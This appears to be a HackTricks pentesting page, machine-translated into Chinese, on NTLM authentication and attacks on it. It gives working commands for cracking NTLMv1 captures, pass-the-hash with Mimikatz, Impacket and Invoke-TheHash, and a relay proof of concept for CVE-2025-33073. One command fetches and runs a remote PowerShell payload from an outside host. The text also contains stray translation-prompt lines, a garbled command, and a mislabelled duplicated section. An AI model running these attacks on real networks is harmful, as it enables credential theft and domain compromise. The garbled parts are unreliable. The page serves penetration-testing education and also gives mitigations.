# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

在运行 **Windows XP 和 Server 2003** 的环境中，会使用 LM（Lan Manager）hash，尽管众所周知，这些 hash 很容易被破解。特定的 LM hash `AAD3B435B51404EEAAD3B435B51404EE` 表示未使用 LM，即空字符串的 hash。

默认情况下，**Kerberos** authentication protocol 是主要使用的方法。NTLM（NT LAN Manager）会在特定情况下介入：不存在 Active Directory、不存在 domain、由于配置不当导致 Kerberos malfunction，或使用 IP address 而不是有效 hostname 尝试建立连接时。

网络数据包中出现 **"NTLMSSP"** header 表明正在进行 NTLM authentication。

对 authentication protocols - LM、NTLMv1 和 NTLMv2 的支持由位于 `%windir%\Windows\System32\msv1\_0.dll` 的特定 DLL 提供。

**关键点**：

- LM hashes 存在漏洞，空 LM hash（`AAD3B435B51404EEAAD3B435B51404EE`）表示未使用 LM。
- Kerberos 是默认的 authentication method，NTLM 仅在特定条件下使用。
- NTLM authentication packets 可通过 "NTLMSSP" header 识别。
- LM、NTLMv1 和 NTLMv2 protocols 由系统文件 `msv1\_0.dll` 支持。

## LM, NTLMv1 and NTLMv2

你可以检查并配置将使用哪种 protocol：

### GUI

执行 _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level。共有 6 个级别（从 0 到 5）。

![LM, NTLMv1 and NTLMv2 - GUI：执行 secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level。共有 6 个级别（从 0 到 5）](<../../images/image (919).png>)

### Registry

这将设置级别 5：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能的值：
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本 NTLM Domain authentication Scheme

1. **用户**输入其**凭据**
2. 客户端计算机发送**身份验证请求**，其中包含**域名**和**用户名**
3. **服务器**发送**challenge**
4. **客户端**使用密码的哈希作为密钥对**challenge**进行**加密**，并将其作为响应发送
5. **服务器**向**Domain controller**发送**域名、用户名、challenge 和响应**。如果**未配置 Active Directory**，或者域名就是服务器名称，则会在本地**检查凭据**。
6. **Domain controller 检查所有信息是否正确**，并将信息发送给服务器

**服务器**和**Domain Controller**能够通过 **Netlogon** server 创建 **Secure Channel**，因为 Domain Controller 知道服务器的密码（该密码位于 **NTDS.DIT** db 中）。

### Local NTLM authentication Scheme

身份验证过程与**之前提到的相同，但**服务器知道尝试进行身份验证的**用户的哈希**，该哈希位于 **SAM** 文件中。因此，服务器不会向 Domain Controller 发起请求，而是**自行检查**用户是否可以进行身份验证。

### NTLMv1 Challenge

**challenge 的长度为 8 字节**，**响应长度为 24 字节**。

**NT 哈希（16 字节）**被分成**3 个各 7 字节的部分**（7B + 7B + (2B+0x00\*5)）：**最后一部分使用零填充**。然后，使用每个部分分别对 **challenge** 进行**加密**，并将生成的**加密**字节连接起来。总计：8B + 8B + 8B = 24Bytes。

**问题**：

- 缺乏**随机性**
- 这 3 个部分可以被**分别攻击**，以找出 NT 哈希
- **DES 可以被破解**
- 第 3 个密钥始终由 **5 个零**组成。
- 给定**相同的 challenge**，**响应**也会**相同**。因此，你可以将字符串 "**1122334455667788**" 作为 **challenge** 发送给受害者，然后使用**预计算的 rainbow tables**攻击该响应。

### NTLMv1 attack

在现代环境中，Unconstrained delegation 并不常见，但仍可能滥用可访问的 **Print Spooler service**，强制该主机执行身份验证。

你可以滥用 AD 中已有的某些凭据/会话，**要求打印机向你控制的某个主机进行身份验证**。然后，使用 `metasploit auxiliary/server/capture/smb` 或 `responder`，你可以**将身份验证 challenge 设置为 1122334455667788**，捕获身份验证尝试；如果使用的是 **NTLMv1**，你就能够**破解它**。\
如果你使用 `responder`，可以尝试**使用 flag `--lm`**，以尝试**降级**身份验证。\
_注意，对于此技术，身份验证必须使用 NTLMv1 执行（NTLMv2 无效）。_

请记住，打印机将在身份验证期间使用计算机账户，而计算机账户使用**长度较长的随机密码**，你**可能无法**使用常见的**字典**将其**破解**。但是，**NTLMv1** 身份验证**使用 DES**（[此处有更多信息](#ntlmv1-challenge)），因此，使用专门用于破解 DES 的服务，你将能够破解它（例如，可以使用 [https://crack.sh/](https://crack.sh) 或 [https://ntlmv1.com/](https://ntlmv1.com)）。

### 使用 hashcat 攻击 NTLMv1

NTLMv1 也可以使用 [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) 进行攻击，该工具可将捕获的 NTLMv1 消息转换为适用于 Hashcat 的格式。<sup>[[1]](#references)</sup>

命令
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
请提供需要翻译的 Markdown 内容。
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to put in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
运行 hashcat（最好通过 hashtopolis 之类的工具进行分布式处理），否则可能需要数天。
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
在此情况下，我们知道密码是 password，所以为了演示目的，我们将作弊：
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
现在需要使用 hashcat-utilities 将破解出的 des 密钥转换为 NTLM 哈希的一部分：
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
请提供需要翻译的原文内容。
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the content to combine.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge 的长度为 8 字节**，并且会发送 **2 个响应**：其中一个长度为 **24 字节**，另一个的长度则是**可变的**。

**第一个响应**通过使用 **HMAC_MD5** 对由**客户端和域**组成的**字符串**进行加密来创建，并使用 **NT hash** 的 **MD4 hash** 作为**密钥**。然后，使用该**结果**作为**密钥**，通过 **HMAC_MD5** 对 **challenge** 进行加密。随后会加入一个 **8 字节的客户端 challenge**。总计：24 B。

**第二个响应**使用**多个值**创建（新的客户端 challenge、用于避免 **replay attacks** 的**时间戳**……）。

如果你有一个包含成功 authentication exchange 的 **PCAP**，请提取域、用户名、server challenge 和 NTLMv2 response，将 capture 格式化以供 Hashcat 使用，并使用模式 `5600` 尝试恢复密码。存档的实战 walkthrough 保留了数据包字段提取步骤，而 Hashcat 的示例定义了当前接受的格式。<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**一旦你获得 victim 的 hash**，就可以使用它来**冒充** victim。\
你需要使用一个**工具**来**使用该 hash 执行** **NTLM authentication**，或者可以创建一个新的 **sessionlogon**，并将该 **hash** **注入** **LSASS**，这样每当执行 **NTLM authentication** 时，都会使用该 **hash**。后一种方式正是 mimikatz 的工作方式。

**请记住，也可以使用 Computer accounts 执行 Pass-the-Hash attacks。**

### **Mimikatz**

**需要以管理员身份运行**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
这会在当前本地用户上下文中启动一个进程，同时 LSASS 会将所提供的凭据与其出站网络登录关联起来。随后，你可以使用所提供的用户身份访问网络资源，类似于 `runas /netonly`，而无需知道明文密码。

### Linux 中的 Pass-the-Hash

你可以在 Linux 上使用 Pass-the-Hash 在 Windows 机器中获得代码执行。\
[**查看实际的 Pass-the-Hash 执行示例。**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket Windows 编译工具

你可以[在此处下载 Windows 版 impacket 二进制文件](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe**（此时需要指定命令；cmd.exe 和 powershell.exe 无法用于获取交互式 shell）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- 还有更多 Impacket 二进制文件……

### Invoke-TheHash

你可以从此处获取 PowerShell 脚本：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

此函数结合了前述模式。你可以传入**多个主机**，排除指定目标，并选择 _SMBExec、WMIExec、SMBClient_ 或 _SMBEnum_。如果选择 _**SMBExec**_ 或 _**WMIExec**_ 时未提供 _**Command**_ 参数，它只会检查你是否拥有足够的权限。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**需要以管理员身份运行**

此工具会执行与 mimikatz 相同的操作（修改 LSASS 内存）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 使用用户名和密码手动执行 Windows 远程操作


{{#ref}}
../lateral-movement/
{{#endref}}

## 从 Windows 主机提取凭据

有关更多信息，请参阅 [**Stealing Windows Credentials**](../stealing-credentials/README.md)。

## Internal Monologue attack

Internal Monologue Attack 是一种隐蔽的凭据提取技术，允许攻击者从受害者机器中获取 NTLM hashes，**而无需直接与 LSASS 进程交互**。不同于直接从内存中读取 hashes、并且经常被 endpoint security solutions 或 Credential Guard 阻止的 Mimikatz，此攻击通过 **Security Support Provider Interface (SSPI) 对 NTLM authentication package (MSV1_0) 的本地调用**来实现。攻击者首先**降低 NTLM 设置**（例如 LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic），以确保允许使用 NetNTLMv1。然后，攻击者冒充从运行中进程获取的现有用户 tokens，并在本地触发 NTLM authentication，使用已知 challenge 生成 NetNTLMv1 responses。<sup>[[4]](#references)</sup>

捕获这些 NetNTLMv1 responses 后，攻击者可以使用**预计算的 rainbow tables**快速恢复原始 NTLM hashes，从而进一步执行 Pass-the-Hash attacks 进行 lateral movement。更重要的是，Internal Monologue Attack 不会生成 network traffic、注入代码或触发直接的内存转储，因此仍然具有隐蔽性；与 Mimikatz 等传统方法相比，防御者更难检测到它。

如果 NetNTLMv1 未被接受——例如由于强制执行的 security policies——攻击者可能无法获取 NetNTLMv1 response。

为处理这种情况，Internal Monologue tool 已进行了更新：如果 NetNTLMv1 失败，它会通过 `AcceptSecurityContext()` 动态获取 server token，仍然**捕获 NetNTLMv2 responses**。虽然 NetNTLMv2 更难破解，但在有限情况下，它仍然为 relay attacks 或 offline brute-force 提供了路径。

PoC 可在 **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** 中找到。<sup>[[4]](#references)</sup>

## NTLM Relay and Responder

**有关如何执行这些 attacks 的更详细指南，请参阅：**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## 从 network capture 中解析 NTLM challenges

**你可以使用** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows 包含多种 mitigation，用于阻止 *reflection* attacks：源自某台主机的 NTLM（或 Kerberos）authentication 被 relay 回**同一台**主机，以获取 SYSTEM privileges。

Microsoft 通过 MS08-068（SMB→SMB）、MS09-013（HTTP→SMB）、MS15-076（DCOM→DCOM）及后续 patches 修复了大多数公开的 chains；然而，**CVE-2025-33073** 表明，通过滥用 **SMB client 截断包含 *marshalled*（serialized）target-info 的 Service Principal Names (SPNs)** 的行为，仍然可以绕过这些 protections。<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR of the bug
1. 攻击者注册一个 **DNS A-record**，其 label 编码了一个 marshalled SPN——例如：
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. 诱使受害者向该 hostname 进行 authentication（PetitPotam、DFSCoerce 等）。
3. 当 SMB client 将 target string `cifs/srv11UWhRCAAAAA…` 传递给 `lsasrv!LsapCheckMarshalledTargetInfo` 时，对 `CredUnmarshalTargetInfo` 的调用会**移除** serialized blob，只留下 **`cifs/srv1`**。
4. `msv1_0!SspIsTargetLocalhost`（或对应的 Kerberos equivalent）现在会将该 target 视为 *localhost*，因为 short host part 与计算机名称（`SRV1`）匹配。
5. 因此，server 会设置 `NTLMSSP_NEGOTIATE_LOCAL_CALL`，并将 **LSASS 的 SYSTEM access-token** 注入 context（对于 Kerberos，则会创建一个标记为 SYSTEM 的 subsession key）。
6. 使用 `ntlmrelayx.py` **或** `krbrelayx.py` relay 该 authentication，即可在同一主机上获得完整的 SYSTEM rights。<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* 针对 **CVE-2025-33073** 的 KB patch 在 `mrxsmb.sys::SmbCeCreateSrvCall` 中添加了检查，会阻止目标包含 marshalled info 的任何 SMB connection（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`）。<sup>[[5]](#references)[[6]](#references)</sup>
* 强制启用 **SMB signing**，即使在未打 patch 的主机上也能防止 reflection。
* 监控类似于 `*<base64>...*` 的 DNS records，并阻止 coercion vectors（PetitPotam、DFSCoerce、AuthIP...）。

### Detection ideas
* 包含 `NTLMSSP_NEGOTIATE_LOCAL_CALL` 且 client IP ≠ server IP 的 network captures。
* 包含 subsession key 且 client principal 等于 hostname 的 Kerberos AP-REQ。
* Windows Event 4624/4648 SYSTEM logons 后，紧接着同一主机发起 remote SMB writes。<sup>[[5]](#references)</sup>

对于 **March 2026** 中利用 **SMB arbitrary ports** 和 **TCP connection reuse** 来获取 `NT AUTHORITY\SYSTEM` 的 local reflection variant，请参阅：

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 多功能工具](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat 示例 hashes – NetNTLMv2（mode 5600）](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash 工具集](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack：无需接触 LSASS 即可获取 NTLM Hashes](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection 已死，NTLM Reflection 万岁！](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [破解 NTLMv2 Hash – 801Labs（Internet Archive）](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
